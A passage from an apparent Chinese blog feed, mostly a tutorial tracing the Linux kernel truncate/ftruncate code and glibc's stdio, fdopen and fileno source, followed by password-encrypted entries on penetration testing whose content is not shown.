<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">truncate</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">off_t</span> length)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ftruncate</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> length)</span>;</span><br></pre></td></tr></table></figure></div>

<p>两者之间的唯一区别在于，truncate截断的是路径path指定的文件，ftruncate截断的是fd引用的文件。length可以大于文件本身的大小，这时文件长度将变为length的大小，扩充的内容均被填充为0。需要注意的是，尽管ftruncate使用的是文件描述符，但是其并不会更新当前文件的偏移。</p>
<h2 id="truncate-内核源码追踪"><a href="#truncate-内核源码追踪" class="headerlink" title="truncate 内核源码追踪"></a>truncate 内核源码追踪</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE2(truncate, <span class="type">const</span> <span class="type">char</span> __user *, path, <span class="type">long</span>, length)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> do_sys_truncate(path, length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_sys_truncate</span><span class="params">(<span class="type">const</span> <span class="type">char</span> __user *pathname, <span class="type">loff_t</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">path</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">    <span class="type">int</span> error;</span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="comment">/* 长度不能为负数 */</span></span><br><span class="line">    <span class="keyword">if</span> (length &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">/* 得到路径结构 */</span></span><br><span class="line">    error = user_path(pathname, &amp;path);</span><br><span class="line">    <span class="keyword">if</span> (error)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    inode = path.dentry-&gt;d_inode;</span><br><span class="line">    error = -EISDIR;</span><br><span class="line">    <span class="comment">/* 目录不能被截断 */</span></span><br><span class="line">    <span class="keyword">if</span> (S_ISDIR(inode-&gt;i_mode))</span><br><span class="line">        <span class="keyword">goto</span> dput_and_out;</span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="comment">/* 不是普通文件不能被截断 */</span></span><br><span class="line">    <span class="keyword">if</span> (!S_ISREG(inode-&gt;i_mode))</span><br><span class="line">        <span class="keyword">goto</span> dput_and_out;</span><br><span class="line">    <span class="comment">/* 尝试获得文件系统的写权限 */</span></span><br><span class="line">    error = mnt_want_write(path.mnt);</span><br><span class="line">    <span class="keyword">if</span> (error)</span><br><span class="line">        <span class="keyword">goto</span> dput_and_out;</span><br><span class="line">    <span class="comment">/* 检查是否有文件写权限 */</span></span><br><span class="line">    error = inode_permission(inode, MAY_WRITE);</span><br><span class="line">    <span class="keyword">if</span> (error)</span><br><span class="line">        <span class="keyword">goto</span> mnt_drop_write_and_out;</span><br><span class="line">    error = -EPERM;</span><br><span class="line">    <span class="comment">/* 文件设置了追加属性，则不能被截断 */</span></span><br><span class="line">    <span class="keyword">if</span> (IS_APPEND(inode))</span><br><span class="line">        <span class="keyword">goto</span> mnt_drop_write_and_out;</span><br><span class="line">    <span class="comment">/* 得到inode的写权限 */</span></span><br><span class="line">    error = get_write_access(inode);</span><br><span class="line">    <span class="keyword">if</span> (error)</span><br><span class="line">        <span class="keyword">goto</span> mnt_drop_write_and_out;</span><br><span class="line">    <span class="comment">/* 查看是否与文件lease锁相冲突 */</span></span><br><span class="line">    error = break_lease(inode, O_WRONLY);</span><br><span class="line">    <span class="comment">/* 检查是否与文件锁相冲突 */</span></span><br><span class="line">    <span class="keyword">if</span> (error)</span><br><span class="line">        <span class="keyword">goto</span> put_write_and_out; </span><br><span class="line">    error = locks_verify_truncate(inode, <span class="literal">NULL</span>, length);</span><br><span class="line">    <span class="keyword">if</span> (!error)</span><br><span class="line">        error = security_path_truncate(&amp;path);</span><br><span class="line">    <span class="comment">/* 如果没有错误，则进行真正的截断 */</span></span><br><span class="line">    <span class="keyword">if</span> (!error)</span><br><span class="line">        error = do_truncate(path.dentry, length, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">put_write_and_out:</span><br><span class="line">    put_write_access(inode);</span><br><span class="line">mnt_drop_write_and_out:</span><br><span class="line">    mnt_drop_write(path.mnt);</span><br><span class="line">dput_and_out:</span><br><span class="line">    path_put(&amp;path);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">do_truncate</span><span class="params">(<span class="keyword">struct</span> dentry *dentry, <span class="type">loff_t</span> length, <span class="type">unsigned</span> <span class="type">int</span> time_attrs,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iattr</span> <span class="title">newattrs</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (length &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">/* 设置要改变的属性，对于截断来说，最重要的是文件长度 */</span></span><br><span class="line">    newattrs.ia_size = length;</span><br><span class="line">    newattrs.ia_valid = ATTR_SIZE | time_attrs;</span><br><span class="line">    <span class="keyword">if</span> (filp) &#123;</span><br><span class="line">        newattrs.ia_file = filp;</span><br><span class="line">        newattrs.ia_valid |= ATTR_FILE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  suid权限一定会被去掉同时设置sgid和xgrp时，sgid权限也会被去掉</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ret = should_remove_suid(dentry);</span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        newattrs.ia_valid |= ret | ATTR_FORCE;</span><br><span class="line">    <span class="comment">/* 修改inode属性 */</span></span><br><span class="line">    mutex_lock(&amp;dentry-&gt;d_inode-&gt;i_mutex);</span><br><span class="line">    ret = notify_change(dentry, &amp;newattrs);</span><br><span class="line">    mutex_unlock(&amp;dentry-&gt;d_inode-&gt;i_mutex);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ftruncate-内核源码追踪"><a href="#ftruncate-内核源码追踪" class="headerlink" title="ftruncate 内核源码追踪"></a>ftruncate 内核源码追踪</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE2(ftruncate, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">unsigned</span> <span class="type">long</span>, length)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 真正的工作函数do_sys_ftruncate */</span></span><br><span class="line">    <span class="type">long</span> ret = do_sys_ftruncate(fd, length, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* avoid REGPARM breakage on x86: */</span></span><br><span class="line">    asmlinkage_protect(<span class="number">2</span>, ret, fd, length);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_sys_ftruncate</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">loff_t</span> length, <span class="type">int</span> small)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> * <span class="title">inode</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line">    <span class="type">int</span> error;</span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="comment">/* 长度检查 */</span></span><br><span class="line">    <span class="keyword">if</span> (length &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    error = -EBADF;</span><br><span class="line">    <span class="comment">/* 从文件描述符得到file指针 */</span></span><br><span class="line">    file = fget(fd);</span><br><span class="line">    <span class="keyword">if</span> (!file)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">/* 如果文件是以O_LARGEFILE选项打开的，则将标志small置为0即假 */</span></span><br><span class="line">    <span class="keyword">if</span> (file-&gt;f_flags &amp; O_LARGEFILE)</span><br><span class="line">        small = <span class="number">0</span>;</span><br><span class="line">    dentry = file-&gt;f_path.dentry;</span><br><span class="line">    inode = dentry-&gt;d_inode;</span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="comment">/* 如果文件不是普通文件或文件不是写打开，则报错 */</span></span><br><span class="line">    <span class="keyword">if</span> (!S_ISREG(inode-&gt;i_mode) || !(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">        <span class="keyword">goto</span> out_putf;</span><br><span class="line">    error = -EINVAL;    <span class="comment">/* Cannot ftruncate over 2^31 bytes without large file support */</span></span><br><span class="line">    <span class="comment">/* 如果文件不是以O_LARGEFILE打开的话，长度就不能超过MAX_NON_LFS */</span></span><br><span class="line">    <span class="keyword">if</span> (small &amp;&amp; length &gt; MAX_NON_LFS)</span><br><span class="line">        <span class="keyword">goto</span> out_putf;</span><br><span class="line">    error = -EPERM;</span><br><span class="line">    <span class="comment">/* 如果是追加模式打开的，也不能进行截断 */</span></span><br><span class="line">    <span class="keyword">if</span> (IS_APPEND(inode))</span><br><span class="line">        <span class="keyword">goto</span> out_putf;</span><br><span class="line">    <span class="comment">/* 检查是否有锁冲突 */</span></span><br><span class="line">    error = locks_verify_truncate(inode, file, length);</span><br><span class="line">    <span class="keyword">if</span> (!error)</span><br><span class="line">        error = security_path_truncate(&amp;file-&gt;f_path);</span><br><span class="line">    <span class="keyword">if</span> (!error) &#123;</span><br><span class="line">        <span class="comment">/* 执行截断操作—前文已经分析过 */</span></span><br><span class="line">        error = do_truncate(dentry, length, ATTR_MTIME|ATTR_CTIME, file);&#125;</span><br><span class="line">out_putf:</span><br><span class="line">    fput(file);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="标准I-O库"><a href="#标准I-O库" class="headerlink" title="标准I&#x2F;O库"></a>标准I&#x2F;O库</h1><h2 id="stdin-stdout和stderr"><a href="#stdin-stdout和stderr" class="headerlink" title="stdin,stdout和stderr"></a>stdin,stdout和stderr</h2><p>当Linux新建一个进程时，会自动创建3个文件描述符0、1和2，分别对应标准输入、标准输出和错误输出。C库中与文件描述符对应的是文件指针，与文件描述符0、1和2类似，我们可以直接使用文件指针stdin、stdout和stderr。</p>
<p>查看C库头文件<code>stdio.h</code>中的源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"><span class="comment">/* Standard streams.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdin</span>;</span>      <span class="comment">/* Standard input stream.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdout</span>;</span>     <span class="comment">/* Standard output stream.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stderr</span>;</span>     <span class="comment">/* Standard error output stream.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __STDC__</span></span><br><span class="line"><span class="comment">/* C89/C99 say they&#x27;re macros.  Make them happy.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> stdin stdin</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> stdout stdout</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> stderr stderr</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>从上面的源码可以看出，stdin、stdout和stderr确实是文件指针。而C标准要求stdin、stdout和stderr是宏定义，所以在C库的代码中又定义了同名宏。stdin、stdout和stderr 定义代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">_IO_FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">_IO_FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure></div>

<p>继续查看<code>_IO_2_1_stdin_</code>等的定义，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br></pre></td></tr></table></figure></div>

<p>DEF_STDFILE是一个宏定义，用于初始化C库中的FILE结构。这里_IO_2_1_stdin、_IO_2_1_stdout和_IO_2_1_stderr这三个FILE结构分别用于文件描述符0、1和2的初始化，这样C库的文件指针就与系统的文件描述符互相关联起来了。大家注意最后的标志位，stdin是不可写的，stdout是不可读的，而stderr不仅不可读，且没有缓存。</p>
<h2 id="fdopen与fileno"><a href="#fdopen与fileno" class="headerlink" title="fdopen与fileno"></a>fdopen与fileno</h2><p>Linux提供了文件描述符，而C库又提供了文件流。在平时的工作中，有时候需要在两者之间进行切换，因此C库提供了两个API：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">FILE *<span class="title function_">fdopen</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> *mode)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fileno</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure></div>

<p>fdopen用于从文件描述符fd生成一个文件流FILE，而fileno则用于从文件流FILE得到对应的文件描述符。</p>
<p>fdopen 实现如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_fdopen (<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> use_mmap = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Decide whether we modify the offset of the file we attach to and seek to</span></span><br><span class="line"><span class="comment">     the end of file.  We only do this if the mode is &#x27;a&#x27; and if the file</span></span><br><span class="line"><span class="comment">     descriptor did not have O_APPEND in its flags already.  */</span></span><br><span class="line">  <span class="type">bool</span> do_seek = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">5</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">	  read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">	  use_mmap = <span class="number">1</span>;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* Ignore */</span></span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="type">int</span> fd_flags = __fcntl (fd, F_GETFL);</span><br><span class="line">  <span class="keyword">if</span> (fd_flags == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (((fd_flags &amp; O_ACCMODE) == O_RDONLY &amp;&amp; !(read_write &amp; _IO_NO_WRITES))</span><br><span class="line">      || ((fd_flags &amp; O_ACCMODE) == O_WRONLY &amp;&amp; !(read_write &amp; _IO_NO_READS)))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The May 93 draft of P1003.4/D14.1 (redesignated as 1003.1b)</span></span><br><span class="line"><span class="comment">     [System Application Program Interface (API) Amendment 1:</span></span><br><span class="line"><span class="comment">     Realtime Extensions], Rationale B.8.3.3</span></span><br><span class="line"><span class="comment">     Open a Stream on a File Descriptor says:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	 Although not explicitly required by POSIX.1, a good</span></span><br><span class="line"><span class="comment">	 implementation of append (&quot;a&quot;) mode would cause the</span></span><br><span class="line"><span class="comment">	 O_APPEND flag to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     (Historical implementations [such as Solaris2] do a one-time</span></span><br><span class="line"><span class="comment">     seek in fdopen.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     However, we do not turn O_APPEND off if the mode is &quot;w&quot; (even</span></span><br><span class="line"><span class="comment">     though that would seem consistent) because that would be more</span></span><br><span class="line"><span class="comment">     likely to break historical programs.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; _IO_IS_APPENDING) &amp;&amp; !(fd_flags &amp; O_APPEND))</span><br><span class="line">    &#123;</span><br><span class="line">      do_seek = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (__fcntl (fd, F_SETFL, fd_flags | O_APPEND) == <span class="number">-1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _G_HAVE_MMAP</span></span><br><span class="line">	       (use_mmap &amp;&amp; (read_write &amp; _IO_NO_WRITES))</span><br><span class="line">	       ? &amp;_IO_wfile_jumps_maybe_mmap :</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	       &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) =</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _G_HAVE_MMAP</span></span><br><span class="line">    (use_mmap &amp;&amp; (read_write &amp; _IO_NO_WRITES)) ? &amp;_IO_file_jumps_maybe_mmap :</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="comment">/* We only need to record the fd because _IO_file_init_internal will</span></span><br><span class="line"><span class="comment">     have unset the offset.  It is important to unset the cached</span></span><br><span class="line"><span class="comment">     offset because the real offset in the file could change between</span></span><br><span class="line"><span class="comment">     now and when the handle is activated and we would then mislead</span></span><br><span class="line"><span class="comment">     ftell into believing that we have a valid offset.  */</span></span><br><span class="line">  new_f-&gt;fp.file._fileno = fd;</span><br><span class="line">  new_f-&gt;fp.file._flags &amp;= ~_IO_DELETE_DONT_CLOSE;</span><br><span class="line"></span><br><span class="line">  _IO_mask_flags (&amp;new_f-&gt;fp.file, read_write,</span><br><span class="line">		  _IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For append mode, set the file offset to the end of the file if we added</span></span><br><span class="line"><span class="comment">     O_APPEND to the file descriptor flags.  Don&#x27;t update the offset cache</span></span><br><span class="line"><span class="comment">     though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> (do_seek &amp;&amp; ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">		  == (_IO_IS_APPENDING | _IO_NO_READS)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (&amp;new_f-&gt;fp.file, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> &amp;new_f-&gt;fp.file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其基本工作是创建一个新的文件流FILE，并建立文件流FILE与描述符的对应关系。</p>
<hr>
<p>fileno 实现如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__fileno (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  CHECK_FILE (fp, EOF);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_IS_FILEBUF) || _IO_fileno (fp) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> _IO_fileno (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从fileno的实现基本上就可以得知文件流与文件描述符的对应关系。文件流FILE保存了文件描述符的值。当从文件流转换到文件描述符时，可以直接通过当前FILE保存的值<code>_fileno</code>得到fd。而从文件描述符转换到文件流时，C库返回的都是一个重新申请的文件流FILE，且这个FILE的<code>_fileno</code>保存了文件描述符。因此无论是fdopen还是fileno，关闭文件时，都要使用fclose来关闭文件，而不是用close。因为只有采用此方式，fclose作为C库函数，才会释放文件流FILE占用的内存。</p>
]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>Linux_kernel的文件IO</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之免杀与远控</title>
    <url>/2024/01/19/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%85%8D%E6%9D%80%E4%B8%8E%E8%BF%9C%E6%8E%A7/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ea1f5e1702534b10379794d27d972e77e4d23eee8387dcdb92b3dc45abb01c12">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f637efa9558e74f8d414916a01f5fabf711743c93f126a6f95dffbf7e12a69fb5cbca9235d7a9821cce9d1bec6ab0a499cb63ab785fc57f954f16234ce12ded4ad652273d88b573ebcd6bc407cc682ce7b3067ecf51acff809f69bcf1047b03eddc8ef3b521772da605e74d77384b4a03acb091e2f000943e31fa30cf07cf15dabbb536c5d8b053adff6d5913f691355cba967eb72662292ed03f18e59cfd6a8b1a99632df0660509d6de38acd29346a09391f456110ba82f8894ac4075d8c0c88f1ce0a34507dfb56b9377fb30fab48589bc95604d2e4802037dc9d387f9f3b15a1bc43c1c3973d7799063beee0bc32fbe35e912c3c4592dca955bdace98ffa60c270715cc35af7f178e85b2d41a336c8b8d52a9bb354efb1ecae49c98a3078347009449d4b345856c84cfcd91df6552bab25f406b03a797a3f0ae0118accdeccdc10c54dfb7f5c0a4845408db583d618b8fd989bea0986e1852ee1487011924cb4b1ae2868fba3c93f993c47637dd004954696e8698ea6d1fa73f4042021096c28ad91805b5f7e6273224b1b86817c41583a660ebad41898feb16456065f7a781866677c30069a7a32824ff1804bcfacc</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>免杀与远控</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透手札之信息收集</title>
    <url>/2023/12/26/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="6eab720f6c48c5302d1b6a3822e6b242ae5f69b1e6f6514f3bf060dcc19f5b22"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>AI安全研习</title>
    <url>/2023/10/30/AI%E5%AE%89%E5%85%A8%E7%A0%94%E4%B9%A0/</url>
    <content><![CDATA[
